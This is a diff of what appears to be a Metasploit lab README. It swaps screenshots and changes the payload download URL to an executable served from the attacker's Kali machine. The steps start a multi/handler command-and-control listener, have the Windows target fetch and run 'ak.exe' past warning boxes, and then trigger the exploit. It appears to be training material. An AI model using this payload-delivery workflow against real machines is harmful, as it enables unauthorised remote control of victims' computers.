@@ -99,11 +99,13 @@ Starting a command and control Server ```use multi/handler```
 
 ### Output 
 
-<img width="607" height="147" alt="image" src="https://github.com/user-attachments/assets/cd3449e9-6e74-4bf6-ada9-cfea88c6ad05" />
+<img width="601" height="176" alt="image" src="https://github.com/user-attachments/assets/b60a2aa9-1e43-4308-a570-2705b6806f67" />
 
 
 
-On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
+On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.56.101/ak.exe``` The file "ak.exe" downloads.
+
+<img width="957" height="602" alt="image" src="https://github.com/user-attachments/assets/35707247-19fe-4bd9-9245-6484e9ac838e" />
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
